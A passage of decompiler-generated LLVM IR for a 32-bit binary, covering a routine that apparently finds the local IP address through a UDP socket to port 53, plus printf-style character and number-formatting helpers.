  %v2_804a9a5 = select i1 %v1_804a99d, i32 %v0_804a9a5, i32 0
  store i32 %v0_804a96a, i32* @ebx, align 4
  store i32 %v0_804a966, i32* @edi, align 4
  ret i32 %v2_804a9a5

; uselistorder directives
  uselistorder i32 %v1_804a98d, { 0, 1, 3, 4, 2 }
  uselistorder i32 %v0_804a99b.pre, { 1, 0, 2 }
  uselistorder i32 %v1_804a98a, { 1, 0 }
  uselistorder label %dec_label_pc_804a999, { 2, 1, 0 }
}

define i32 @function_804a9ae(i32 %arg1) local_unnamed_addr {
dec_label_pc_804a9ae:
  %v1_804a9b1 = call i32 @function_80490fc(i32 ptrtoint (i32* @0 to i32))
  %v1_804a9bb = urem i32 %v1_804a9b1, 2
  %v2_804a9bb = icmp eq i32 %v1_804a9bb, 0
  br i1 %v2_804a9bb, label %dec_label_pc_804a9cc, label %dec_label_pc_804a9c5

dec_label_pc_804a9c5:                             ; preds = %dec_label_pc_804a9ae
  br label %dec_label_pc_804a9cc

dec_label_pc_804a9cc:                             ; preds = %dec_label_pc_804a9c5, %dec_label_pc_804a9ae
  %v0_804a9ca = phi i32 [ -1136921171, %dec_label_pc_804a9c5 ], [ -1740966483, %dec_label_pc_804a9ae ]
  ret i32 %v0_804a9ca

; uselistorder directives
  uselistorder i32 (i32)* @function_80490fc, { 6, 8, 3, 2, 1, 0, 7, 5, 4 }
}

define i32 @function_804a9d0() local_unnamed_addr {
dec_label_pc_804a9d0:
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  store i32 16, i32* %stack_var_-12, align 4
  %v3_804a9e3 = call i32 @function_804b584(i32 2, i32 2, i32 0)
  store i32 %v3_804a9e3, i32* %esi.global-to-local, align 4
  %v10_804a9ef = icmp eq i32 %v3_804a9e3, -1
  br i1 %v10_804a9ef, label %dec_label_pc_804aa42, label %dec_label_pc_804a9f4

dec_label_pc_804a9f4:                             ; preds = %dec_label_pc_804a9d0
  store i32 2, i32* %stack_var_-28, align 4
  %v2_804a9fb = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a9fb, i32* @ebx, align 4
  %v1_804a9ff = call i32 @function_804a9ae(i32 2)
  %v2_804aa0f = call i32 @function_804b330(i32 13568)
  %v1_804aa14 = inttoptr i32 %v2_804aa0f to i32*
  store i32 0, i32* %v1_804aa14, align 4
  %v0_804aa1e = load i32, i32* %esi.global-to-local, align 4
  %v4_804aa1f = call i32 @function_804b3ec(i32 %v0_804aa1e, i32 %v2_804a9fb, i32 16, i32 %v2_804aa0f)
  %v2_804aa27 = ptrtoint i32* %stack_var_-12 to i32
  %v3_804aa2e = call i32 @function_804b417(i32 %v0_804aa1e, i32 %v2_804a9fb, i32 %v2_804aa27)
  %v1_804aa36 = call i32 @function_804ae74(i32 %v0_804aa1e)
  br label %dec_label_pc_804aa42

dec_label_pc_804aa42:                             ; preds = %dec_label_pc_804a9d0, %dec_label_pc_804a9f4
  %v0_804aa47 = phi i32 [ 0, %dec_label_pc_804a9d0 ], [ %v1_804a9ff, %dec_label_pc_804a9f4 ]
  ret i32 %v0_804aa47

; uselistorder directives
  uselistorder i32* %stack_var_-28, { 1, 0 }
  uselistorder i32* %stack_var_-12, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @function_804b3ec, { 3, 1, 2, 0 }
  uselistorder i32 (i32)* @function_804a9ae, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @function_804b584, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_804aa42, { 1, 0 }
}

define i32 @function_804aa48() local_unnamed_addr {
dec_label_pc_804aa48:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i8, align 1
  %v0_804aa4b = load i32, i32* @eax, align 4
  %v1_804aa4b = icmp eq i32 %v0_804aa4b, 0
  store i32 %v0_804aa4b, i32* @ecx, align 4
  %v0_804aa4f = load i32, i32* @edx, align 4
  %v5_804aa4f = trunc i32 %v0_804aa4f to i8
  store i8 %v5_804aa4f, i8* %stack_var_-4, align 1
  br i1 %v1_804aa4b, label %dec_label_pc_804aa61, label %dec_label_pc_804aa55

dec_label_pc_804aa55:                             ; preds = %dec_label_pc_804aa48
  %v1_804aa55 = inttoptr i32 %v0_804aa4b to i32*
  %v2_804aa55 = load i32, i32* %v1_804aa55, align 4
  %sext = mul i32 %v0_804aa4f, 16777216
  %v4_804aa57 = sdiv i32 %sext, 16777216
  store i32 %v4_804aa57, i32* %eax.global-to-local, align 4
  %v3_804aa5b = inttoptr i32 %v2_804aa55 to i8*
  store i8 %v5_804aa4f, i8* %v3_804aa5b, align 1
  %v0_804aa5d = load i32, i32* @ecx, align 4
  %v1_804aa5d = inttoptr i32 %v0_804aa5d to i32*
  %v2_804aa5d = load i32, i32* %v1_804aa5d, align 4
  %v3_804aa5d = add i32 %v2_804aa5d, 1
  store i32 %v3_804aa5d, i32* %v1_804aa5d, align 4
  %v0_804aa76.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804aa73

dec_label_pc_804aa61:                             ; preds = %dec_label_pc_804aa48
  %v2_804aa64 = ptrtoint i8* %stack_var_-4 to i32
  store i32 %v2_804aa64, i32* %eax.global-to-local, align 4
  %v4_804aa6b = bitcast i8* %stack_var_-4 to i32*
  %v5_804aa6b = call i32 @function_804b115(i32 1, i32* %v4_804aa6b, i32 1, i32 0)
  store i32 %v5_804aa6b, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804aa73

dec_label_pc_804aa73:                             ; preds = %dec_label_pc_804aa55, %dec_label_pc_804aa61
  %v0_804aa76 = phi i32 [ %v0_804aa76.pre, %dec_label_pc_804aa55 ], [ %v5_804aa6b, %dec_label_pc_804aa61 ]
  ret i32 %v0_804aa76

; uselistorder directives
  uselistorder i32 %v0_804aa4b, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804aa73, { 1, 0 }
}

define i32 @function_804aa77(i8 %arg1) local_unnamed_addr {
dec_label_pc_804aa77:
  %ebp.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %v0_804aa78 = load i32, i32* @eax, align 4
  store i32 %v0_804aa78, i32* %ebp.global-to-local, align 4
  %v0_804aa7a = load i32, i32* @edi, align 4
  %v0_804aa7e = load i32, i32* @edx, align 4
  store i32 %v0_804aa7e, i32* %esi.global-to-local, align 4
  %v0_804aa80 = load i32, i32* @ebx, align 4
  %v0_804aa81 = load i32, i32* @ecx, align 4
  store i32 %v0_804aa81, i32* @ebx, align 4
  %v4_804aa88 = sext i8 %arg1 to i32
  %tmp56 = icmp slt i32 %v0_804aa81, 1
  %tmp57 = icmp eq i1 %tmp56, false
  br i1 %tmp57, label %dec_label_pc_804aa91.preheader, label %dec_label_pc_804aaae

dec_label_pc_804aa91.preheader:                   ; preds = %dec_label_pc_804aa77
  %v3_804aa9123 = inttoptr i32 %v0_804aa7e to i8*
  %v4_804aa9124 = load i8, i8* %v3_804aa9123, align 1
  %v5_804aa9125 = icmp eq i8 %v4_804aa9124, 0
  %v1_804aa9527 = icmp eq i1 %v5_804aa9125, false
  br i1 %v1_804aa9527, label %dec_label_pc_804aa90, label %dec_label_pc_804aa97

dec_label_pc_804aa90:                             ; preds = %dec_label_pc_804aa91.preheader, %dec_label_pc_804aa90
  %v0_804aa9029 = phi i32 [ %v1_804aa90, %dec_label_pc_804aa90 ], [ 0, %dec_label_pc_804aa91.preheader ]
  %v1_804aa90 = add i32 %v0_804aa9029, 1
  %v2_804aa91 = add i32 %v1_804aa90, %v0_804aa7e
  %v3_804aa91 = inttoptr i32 %v2_804aa91 to i8*
  %v4_804aa91 = load i8, i8* %v3_804aa91, align 1
  %v5_804aa91 = icmp eq i8 %v4_804aa91, 0
  %v1_804aa95 = icmp eq i1 %v5_804aa91, false
  br i1 %v1_804aa95, label %dec_label_pc_804aa90, label %dec_label_pc_804aa97

dec_label_pc_804aa97:                             ; preds = %dec_label_pc_804aa90, %dec_label_pc_804aa91.preheader
  %v1_804aa9f = phi i32 [ 0, %dec_label_pc_804aa91.preheader ], [ %v1_804aa90, %dec_label_pc_804aa90 ]
  %v5_804aa99 = icmp sgt i32 %v0_804aa81, %v1_804aa9f
  %v2_804aa9f = sub i32 %v0_804aa81, %v1_804aa9f
  %storemerge = select i1 %v5_804aa99, i32 %v2_804aa9f, i32 0
  store i32 %storemerge, i32* @ebx, align 4
  %v2_804aaa1 = and i32 %v4_804aa88, 2
  %v3_804aaa1 = icmp eq i32 %v2_804aaa1, 0
  %v1_804aaac = icmp eq i1 %v3_804aaa1, false
  br i1 %v1_804aaac, label %dec_label_pc_804aab6, label %dec_label_pc_804aaae

dec_label_pc_804aaae:                             ; preds = %dec_label_pc_804aa77, %dec_label_pc_804aa97
  %v4_804aade1141 = phi i32 [ 0, %dec_label_pc_804aa77 ], [ %v1_804aa9f, %dec_label_pc_804aa97 ]
  %v0_804aacc1732 = phi i32 [ %v0_804aa81, %dec_label_pc_804aa77 ], [ %storemerge, %dec_label_pc_804aa97 ]
  br label %dec_label_pc_804aab6

dec_label_pc_804aab6:                             ; preds = %dec_label_pc_804aa97, %dec_label_pc_804aaae
  %v4_804aade1140 = phi i32 [ %v4_804aade1141, %dec_label_pc_804aaae ], [ %v1_804aa9f, %dec_label_pc_804aa97 ]
  %v0_804aacc17 = phi i32 [ %v0_804aacc1732, %dec_label_pc_804aaae ], [ %storemerge, %dec_label_pc_804aa97 ]
  %storemerge2 = phi i32 [ 32, %dec_label_pc_804aaae ], [ 48, %dec_label_pc_804aa97 ]
  store i32 0, i32* @edi, align 4
  %v2_804aab8 = urem i32 %v4_804aa88, 2
  %v3_804aab8 = icmp eq i32 %v2_804aab8, 0
  %v1_804aabb = icmp eq i1 %v3_804aab8, false
  br i1 %v1_804aabb, label %dec_label_pc_804aade.preheader, label %dec_label_pc_804aacc.preheader

dec_label_pc_804aacc.preheader:                   ; preds = %dec_label_pc_804aab6
  %tmp58 = icmp slt i32 %v0_804aacc17, 1
  %tmp59 = icmp eq i1 %tmp58, false
  br i1 %tmp59, label %dec_label_pc_804aabf.preheader, label %dec_label_pc_804aade.preheader

dec_label_pc_804aabf.preheader:                   ; preds = %dec_label_pc_804aacc.preheader
  store i32 %storemerge2, i32* @edx, align 4
  store i32 %v0_804aa78, i32* @eax, align 4
  store i32 1, i32* @edi, align 4
  %v1_804aac666 = add i32 %v0_804aacc17, -1
  store i32 %v1_804aac666, i32* @ebx, align 4
  %v0_804aac768 = call i32 @function_804aa48()
  %v0_804aacc69 = load i32, i32* @ebx, align 4
  %tmp6071 = icmp slt i32 %v0_804aacc69, 1
  %tmp6172 = icmp eq i1 %tmp6071, false
  br i1 %tmp6172, label %dec_label_pc_804aabf.dec_label_pc_804aabf_crit_edge, label %dec_label_pc_804aacc.dec_label_pc_804aade.preheader.loopexit_crit_edge

dec_label_pc_804aabf.dec_label_pc_804aabf_crit_edge: ; preds = %dec_label_pc_804aabf.preheader, %dec_label_pc_804aabf.dec_label_pc_804aabf_crit_edge
  %v0_804aacc73 = phi i32 [ %v0_804aacc, %dec_label_pc_804aabf.dec_label_pc_804aabf_crit_edge ], [ %v0_804aacc69, %dec_label_pc_804aabf.preheader ]
  %v0_804aac3.pre = load i32, i32* %ebp.global-to-local, align 4
  %v0_804aac5.pre = load i32, i32* @edi, align 4
  store i32 %storemerge2, i32* @edx, align 4
  store i32 %v0_804aac3.pre, i32* @eax, align 4
  %v1_804aac5 = add i32 %v0_804aac5.pre, 1
  store i32 %v1_804aac5, i32* @edi, align 4
  %v1_804aac6 = add i32 %v0_804aacc73, -1
  store i32 %v1_804aac6, i32* @ebx, align 4
  %v0_804aac7 = call i32 @function_804aa48()
  %v0_804aacc = load i32, i32* @ebx, align 4
  %tmp60 = icmp slt i32 %v0_804aacc, 1
  %tmp61 = icmp eq i1 %tmp60, false
  br i1 %tmp61, label %dec_label_pc_804aabf.dec_label_pc_804aabf_crit_edge, label %dec_label_pc_804aacc.dec_label_pc_804aade.preheader.loopexit_crit_edge

dec_label_pc_804aacc.dec_label_pc_804aade.preheader.loopexit_crit_edge: ; preds = %dec_label_pc_804aabf.dec_label_pc_804aabf_crit_edge, %dec_label_pc_804aabf.preheader
  %v0_804aac7.lcssa = phi i32 [ %v0_804aac768, %dec_label_pc_804aabf.preheader ], [ %v0_804aac7, %dec_label_pc_804aabf.dec_label_pc_804aabf_crit_edge ]
  %v0_804aacc.lcssa = phi i32 [ %v0_804aacc69, %dec_label_pc_804aabf.preheader ], [ %v0_804aacc, %dec_label_pc_804aabf.dec_label_pc_804aabf_crit_edge ]
  %v0_804aade7.pre.pre = load i32, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804aade.preheader

dec_label_pc_804aade.preheader:                   ; preds = %dec_label_pc_804aacc.preheader, %dec_label_pc_804aacc.dec_label_pc_804aade.preheader.loopexit_crit_edge, %dec_label_pc_804aab6
  %v0_804aaf3445 = phi i32 [ %v0_804aacc17, %dec_label_pc_804aab6 ], [ %v0_804aacc.lcssa, %dec_label_pc_804aacc.dec_label_pc_804aade.preheader.loopexit_crit_edge ], [ %v0_804aacc17, %dec_label_pc_804aacc.preheader ]
  %v4_804aade11 = phi i32 [ %v4_804aade1140, %dec_label_pc_804aab6 ], [ %v0_804aac7.lcssa, %dec_label_pc_804aacc.dec_label_pc_804aade.preheader.loopexit_crit_edge ], [ %v4_804aade1140, %dec_label_pc_804aacc.preheader ]
  %v0_804aade7 = phi i32 [ %v0_804aa7e, %dec_label_pc_804aab6 ], [ %v0_804aade7.pre.pre, %dec_label_pc_804aacc.dec_label_pc_804aade.preheader.loopexit_crit_edge ], [ %v0_804aa7e, %dec_label_pc_804aacc.preheader ]
  %v1_804aade8 = inttoptr i32 %v0_804aade7 to i8*
  %v2_804aade9 = load i8, i8* %v1_804aade8, align 1
  %v3_804aade10 = zext i8 %v2_804aade9 to i32
  %v5_804aade12 = and i32 %v4_804aade11, -256
  %v6_804aade13 = or i32 %v3_804aade10, %v5_804aade12
  %v4_804aae014 = icmp eq i8 %v2_804aade9, 0
  %v1_804aae216 = icmp eq i1 %v4_804aae014, false
  br i1 %v1_804aae216, label %dec_label_pc_804aad2, label %dec_label_pc_804aaf3.preheader

dec_label_pc_804aad2:                             ; preds = %dec_label_pc_804aade.preheader, %dec_label_pc_804aad2
  %v0_804aad2 = phi i32 [ %v6_804aade, %dec_label_pc_804aad2 ], [ %v6_804aade13, %dec_label_pc_804aade.preheader ]
  %v1_804aad2 = urem i32 %v0_804aad2, 256
  store i32 %v1_804aad2, i32* @edx, align 4
  %v0_804aad5 = load i32, i32* %ebp.global-to-local, align 4
  store i32 %v0_804aad5, i32* @eax, align 4
  %v0_804aad7 = call i32 @function_804aa48()
  %v0_804aadc = load i32, i32* @edi, align 4
  %v1_804aadc = add i32 %v0_804aadc, 1
  store i32 %v1_804aadc, i32* @edi, align 4
  %v0_804aadd = load i32, i32* %esi.global-to-local, align 4
  %v1_804aadd = add i32 %v0_804aadd, 1
  store i32 %v1_804aadd, i32* %esi.global-to-local, align 4
  %v1_804aade = inttoptr i32 %v1_804aadd to i8*
  %v2_804aade = load i8, i8* %v1_804aade, align 1
  %v3_804aade = zext i8 %v2_804aade to i32
  %v5_804aade = and i32 %v0_804aad7, -256
  %v6_804aade = or i32 %v3_804aade, %v5_804aade
  %v4_804aae0 = icmp eq i8 %v2_804aade, 0
  %v1_804aae2 = icmp eq i1 %v4_804aae0, false
  br i1 %v1_804aae2, label %dec_label_pc_804aad2, label %dec_label_pc_804aade.dec_label_pc_804aaf3.preheader_crit_edge

dec_label_pc_804aade.dec_label_pc_804aaf3.preheader_crit_edge: ; preds = %dec_label_pc_804aad2
  %v0_804aaf34.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804aaf3.preheader

dec_label_pc_804aaf3.preheader:                   ; preds = %dec_label_pc_804aade.dec_label_pc_804aaf3.preheader_crit_edge, %dec_label_pc_804aade.preheader
  %v0_804aaf34 = phi i32 [ %v0_804aaf34.pre, %dec_label_pc_804aade.dec_label_pc_804aaf3.preheader_crit_edge ], [ %v0_804aaf3445, %dec_label_pc_804aade.preheader ]
  %tmp62 = icmp slt i32 %v0_804aaf34, 1
  %tmp63 = icmp eq i1 %tmp62, false
  br i1 %tmp63, label %dec_label_pc_804aae6, label %dec_label_pc_804aaf7

dec_label_pc_804aae6:                             ; preds = %dec_label_pc_804aaf3.preheader, %dec_label_pc_804aae6
  %v0_804aaed = phi i32 [ %v0_804aaf3, %dec_label_pc_804aae6 ], [ %v0_804aaf34, %dec_label_pc_804aaf3.preheader ]
  store i32 %storemerge2, i32* @edx, align 4
  %v0_804aaea = load i32, i32* %ebp.global-to-local, align 4
  store i32 %v0_804aaea, i32* @eax, align 4
  %v0_804aaec = load i32, i32* @edi, align 4
  %v1_804aaec = add i32 %v0_804aaec, 1
  store i32 %v1_804aaec, i32* @edi, align 4
  %v1_804aaed = add i32 %v0_804aaed, -1
  store i32 %v1_804aaed, i32* @ebx, align 4
  %v0_804aaee = call i32 @function_804aa48()
  %v0_804aaf3 = load i32, i32* @ebx, align 4
  %tmp64 = icmp slt i32 %v0_804aaf3, 1
  %tmp65 = icmp eq i1 %tmp64, false
  br i1 %tmp65, label %dec_label_pc_804aae6, label %dec_label_pc_804aaf7

dec_label_pc_804aaf7:                             ; preds = %dec_label_pc_804aae6, %dec_label_pc_804aaf3.preheader
  %v0_804aafa = load i32, i32* @edi, align 4
  store i32 %v0_804aa80, i32* @ebx, align 4
  store i32 %v0_804aa7a, i32* @edi, align 4
  ret i32 %v0_804aafa

; uselistorder directives
  uselistorder i32 %v0_804aaf3, { 1, 0 }
  uselistorder i32 %v0_804aacc, { 0, 2, 1 }
  uselistorder i32 %storemerge2, { 2, 1, 0 }
  uselistorder i32 %v0_804aacc17, { 1, 2, 0, 3 }
  uselistorder i32 %storemerge, { 1, 2, 0 }
  uselistorder i32 %v1_804aa9f, { 1, 2, 3, 0 }
  uselistorder i32 %v0_804aa81, { 2, 3, 0, 1, 4 }
  uselistorder i32 %v0_804aa7e, { 1, 2, 0, 3, 4 }
  uselistorder label %dec_label_pc_804aae6, { 1, 0 }
  uselistorder label %dec_label_pc_804aad2, { 1, 0 }
  uselistorder label %dec_label_pc_804aade.preheader, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804aabf.dec_label_pc_804aabf_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_804aab6, { 1, 0 }
  uselistorder label %dec_label_pc_804aaae, { 1, 0 }
  uselistorder label %dec_label_pc_804aa90, { 1, 0 }
}

define i32 @function_804ab01() local_unnamed_addr {
dec_label_pc_804ab01:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp15 = call i32 @__decompiler_undefined_function_0()
  %tmp16 = call i8 @__decompiler_undefined_function_1()
  %tmp18 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-17 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %v0_804ab01 = load i32, i32* @ebp, align 4
  %v0_804ab02 = load i32, i32* @eax, align 4
  store i32 %v0_804ab02, i32* @ebp, align 4
  %v0_804ab04 = load i32, i32* @edi, align 4
  %v0_804ab05 = load i32, i32* @edx, align 4
  %v0_804ab08 = load i32, i32* @ebx, align 4
  %v1_804ab0c = icmp eq i32 %v0_804ab05, 0
  %v2_804ab0c = icmp slt i32 %v0_804ab05, 0
  store i32 %tmp18, i32* @edi, align 4
  %v1_804ab12 = icmp eq i1 %v1_804ab0c, false
  br i1 %v1_804ab12, label %dec_label_pc_804ab37, label %dec_label_pc_804ab14

dec_label_pc_804ab14:                             ; preds = %dec_label_pc_804ab01
  store i32 48, i32* %stack_var_-28, align 4
  store i32 %tmp18, i32* @ecx, align 4
  store i32 %v0_804ab02, i32* @eax, align 4
  %v2_804ab25 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804ab25, i32* @edx, align 4
  %v3_804ab2d = call i32 @function_804aa77(i8 %tmp16)
  br label %dec_label_pc_804abcf

dec_label_pc_804ab37:                             ; preds = %dec_label_pc_804ab01
  %v4_804ab37 = icmp eq i32 %tmp15, 0
  br i1 %v4_804ab37, label %dec_label_pc_804ab5b, label %dec_label_pc_804ab3e

dec_label_pc_804ab3e:                             ; preds = %dec_label_pc_804ab37
  %v0_804ab3e = load i32, i32* @ecx, align 4
  %v9_804ab3e = icmp eq i32 %v0_804ab3e, 10
  %v1_804ab41 = icmp eq i1 %v9_804ab3e, false
  br i1 %v1_804ab41, label %dec_label_pc_804ab5b, label %dec_label_pc_804ab43

dec_label_pc_804ab43:                             ; preds = %dec_label_pc_804ab3e
  %v1_804ab45 = icmp eq i1 %v2_804ab0c, false
  br i1 %v1_804ab45, label %dec_label_pc_804ab5b, label %dec_label_pc_804ab47

dec_label_pc_804ab47:                             ; preds = %dec_label_pc_804ab43
  %v1_804ab47 = sub i32 0, %v0_804ab05
  br label %dec_label_pc_804ab5b

dec_label_pc_804ab5b:                             ; preds = %dec_label_pc_804ab37, %dec_label_pc_804ab3e, %dec_label_pc_804ab43, %dec_label_pc_804ab47
  %v0_804ab865 = phi i32 [ %v1_804ab47, %dec_label_pc_804ab47 ], [ %v0_804ab05, %dec_label_pc_804ab43 ], [ %v0_804ab05, %dec_label_pc_804ab3e ], [ %v0_804ab05, %dec_label_pc_804ab37 ]
  %storemerge4 = phi i32 [ 1, %dec_label_pc_804ab47 ], [ 0, %dec_label_pc_804ab43 ], [ 0, %dec_label_pc_804ab3e ], [ 0, %dec_label_pc_804ab37 ]
  %v2_804ab5b = ptrtoint i32* %stack_var_-17 to i32
  store i32 %v2_804ab5b, i32* @ebx, align 4
  store i32 0, i32* %stack_var_-17, align 4
  %v1_804ab866 = icmp eq i32 %v0_804ab865, 0
  %v1_804ab888 = icmp eq i1 %v1_804ab866, false
  br i1 %v1_804ab888, label %dec_label_pc_804ab66.lr.ph, label %dec_label_pc_804ab8a

dec_label_pc_804ab66.lr.ph:                       ; preds = %dec_label_pc_804ab5b
  %v2_804ab79 = add i32 %tmp, -58
  br label %dec_label_pc_804ab66

dec_label_pc_804ab66:                             ; preds = %dec_label_pc_804ab66.lr.ph, %dec_label_pc_804ab7d
  %v1_804ab68 = phi i32 [ %v0_804ab865, %dec_label_pc_804ab66.lr.ph ], [ %div, %dec_label_pc_804ab7d ]
  %v0_804ab68 = load i32, i32* @ecx, align 4
  %div = udiv i32 %v1_804ab68, %v0_804ab68
  %tmp29 = urem i32 %v1_804ab68, %v0_804ab68
  %v7_804ab73 = icmp sgt i32 %tmp29, 9
  br i1 %v7_804ab73, label %dec_label_pc_804ab75, label %dec_label_pc_804ab7d

dec_label_pc_804ab75:                             ; preds = %dec_label_pc_804ab66
  %v3_804ab79 = add i32 %v2_804ab79, %tmp29
  br label %dec_label_pc_804ab7d

dec_label_pc_804ab7d:                             ; preds = %dec_label_pc_804ab66, %dec_label_pc_804ab75
  %v13_804ab7d = phi i32 [ %tmp29, %dec_label_pc_804ab66 ], [ %v3_804ab79, %dec_label_pc_804ab75 ]
  %v1_804ab7d = trunc i32 %v13_804ab7d to i8
  %v2_804ab7d = add i8 %v1_804ab7d, 48
  %v0_804ab7f = load i32, i32* @ebx, align 4
  %v1_804ab7f = add i32 %v0_804ab7f, -1
  store i32 %v1_804ab7f, i32* @ebx, align 4
  %v3_804ab80 = inttoptr i32 %v1_804ab7f to i8*
  store i8 %v2_804ab7d, i8* %v3_804ab80, align 1
  %v1_804ab86 = icmp ugt i32 %v0_804ab68, %v1_804ab68
  %v1_804ab88 = icmp eq i1 %v1_804ab86, false
  br i1 %v1_804ab88, label %dec_label_pc_804ab66, label %dec_label_pc_804ab86.dec_label_pc_804ab8a_crit_edge

dec_label_pc_804ab86.dec_label_pc_804ab8a_crit_edge: ; preds = %dec_label_pc_804ab7d
  %v0_804ab8c.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804ab8a

dec_label_pc_804ab8a:                             ; preds = %dec_label_pc_804ab86.dec_label_pc_804ab8a_crit_edge, %dec_label_pc_804ab5b
  %v0_804abb6 = phi i32 [ %v0_804ab8c.pre, %dec_label_pc_804ab86.dec_label_pc_804ab8a_crit_edge ], [ %v2_804ab5b, %dec_label_pc_804ab5b ]
  store i32 0, i32* @esi, align 4
  %v4_804ab8e = icmp eq i32 %storemerge4, 0
  br i1 %v4_804ab8e, label %dec_label_pc_804abba, label %dec_label_pc_804ab95

dec_label_pc_804ab95:                             ; preds = %dec_label_pc_804ab8a
  %v0_804ab95 = load i32, i32* @edi, align 4
  %v1_804ab95 = icmp eq i32 %v0_804ab95, 0
  br i1 %v1_804ab95, label %dec_label_pc_804abb3, label %dec_label_pc_804ab99

dec_label_pc_804ab99:                             ; preds = %dec_label_pc_804ab95
  %v6_804ab99 = and i8 %tmp16, 2
  %v7_804ab99 = icmp eq i8 %v6_804ab99, 0
  br i1 %v7_804ab99, label %dec_label_pc_804abb3, label %dec_label_pc_804aba0

dec_label_pc_804aba0:                             ; preds = %dec_label_pc_804ab99
  store i32 45, i32* @edx, align 4
  %v0_804aba5 = load i32, i32* @ebp, align 4
  store i32 %v0_804aba5, i32* @eax, align 4
  %v0_804aba7 = call i32 @function_804aa48()
  %v0_804abac = load i32, i32* @edi, align 4
  %v1_804abac = add i32 %v0_804abac, -1
  store i32 %v1_804abac, i32* @edi, align 4
  %v0_804abad = load i32, i32* @esi, align 4
  %v1_804abad = and i32 %v0_804abad, -65536
  %v2_804abad = or i32 %v1_804abad, 1
  store i32 %v2_804abad, i32* @esi, align 4
  br label %dec_label_pc_804abba

dec_label_pc_804abb3:                             ; preds = %dec_label_pc_804ab99, %dec_label_pc_804ab95
  %v1_804abb3 = add i32 %v0_804abb6, -1
  store i32 %v1_804abb3, i32* @ebx, align 4
  store i32 0, i32* @esi, align 4
  %v2_804abb6 = inttoptr i32 %v1_804abb3 to i8*
  store i8 45, i8* %v2_804abb6, align 1
  br label %dec_label_pc_804abba

dec_label_pc_804abba:                             ; preds = %dec_label_pc_804ab8a, %dec_label_pc_804aba0, %dec_label_pc_804abb3
  %v0_804abbd = load i32, i32* @edi, align 4
  store i32 %v0_804abbd, i32* @ecx, align 4
  %v0_804abc3 = load i32, i32* @ebx, align 4
  store i32 %v0_804abc3, i32* @edx, align 4
  %v0_804abc5 = load i32, i32* @ebp, align 4
  store i32 %v0_804abc5, i32* @eax, align 4
  %v3_804abc7 = call i32 @function_804aa77(i8 %tmp16)
  %v0_804abcc = load i32, i32* @esi, align 4
  %v2_804abcc = add i32 %v0_804abcc, %v3_804abc7
  br label %dec_label_pc_804abcf

dec_label_pc_804abcf:                             ; preds = %dec_label_pc_804ab14, %dec_label_pc_804abba
  %storemerge = phi i32 [ %v3_804ab2d, %dec_label_pc_804ab14 ], [ %v2_804abcc, %dec_label_pc_804abba ]
  store i32 %v0_804ab08, i32* @ebx, align 4
  store i32 %v0_804ab04, i32* @edi, align 4
  store i32 %v0_804ab01, i32* @ebp, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v1_804ab68, { 0, 2, 1 }
  uselistorder i32* %stack_var_-28, { 1, 0 }
  uselistorder i32 -65536, { 3, 5, 4, 0, 1, 2 }
  uselistorder label %dec_label_pc_804abcf, { 1, 0 }
  uselistorder label %dec_label_pc_804abba, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804ab7d, { 1, 0 }
  uselistorder label %dec_label_pc_804ab66, { 1, 0 }
  uselistorder label %dec_label_pc_804ab5b, { 3, 2, 1, 0 }
}

define i32 @function_804abd7(i32 %arg1) local_unnamed_addr {
dec_label_pc_804abd7:
  %stack_var_-18 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_804abd7 = load i32, i32* @ebp, align 4
  store i32 0, i32* @ebp, align 4
  %v0_804abda = load i32, i32* @edi, align 4
  %v0_804abdb = load i32, i32* @esi, align 4
  %v0_804abdc = load i32, i32* @ebx, align 4
  store i32 %v0_804abdc, i32* %stack_var_-16, align 4
  %v0_804abdd = load i32, i32* @edx, align 4
  store i32 %v0_804abdd, i32* @ebx, align 4
  %v0_804abe2 = load i32, i32* @eax, align 4
  %v1_804ad1026 = inttoptr i32 %v0_804abdd to i8*
  %v2_804ad1027 = load i8, i8* %v1_804ad1026, align 1
  %v4_804ad1232 = icmp eq i8 %v2_804ad1027, 0
  %v1_804ad1434 = icmp eq i1 %v4_804ad1232, false
  br i1 %v1_804ad1434, label %dec_label_pc_804abef.lr.ph, label %dec_label_pc_804ad1a

dec_label_pc_804abef.lr.ph:                       ; preds = %dec_label_pc_804abd7
  %v3_804ad1028 = zext i8 %v2_804ad1027 to i32
  %v5_804ad1030 = and i32 %v0_804abe2, -256
  %v6_804ad1031 = or i32 %v3_804ad1028, %v5_804ad1030
  %v0_804abe6 = load i32, i32* @ecx, align 4
  %v2_804acef = ptrtoint i32* %stack_var_-18 to i32
  br label %dec_label_pc_804abef

dec_label_pc_804abef:                             ; preds = %dec_label_pc_804abef.lr.ph, %dec_label_pc_804ad0f
  %v0_804abf7 = phi i32 [ %v0_804abdd, %dec_label_pc_804abef.lr.ph ], [ %v1_804ad0f, %dec_label_pc_804ad0f ]
  %v4_804abf8 = phi i32 [ %v6_804ad1031, %dec_label_pc_804abef.lr.ph ], [ %v6_804ad10, %dec_label_pc_804ad0f ]
  %stack_var_-36.435 = phi i32 [ %v0_804abe6, %dec_label_pc_804abef.lr.ph ], [ %stack_var_-36.3, %dec_label_pc_804ad0f ]
  %v1_804abef = trunc i32 %v4_804abf8 to i8
  %v10_804abef = icmp eq i8 %v1_804abef, 37
  %v1_804abf1 = icmp eq i1 %v10_804abef, false
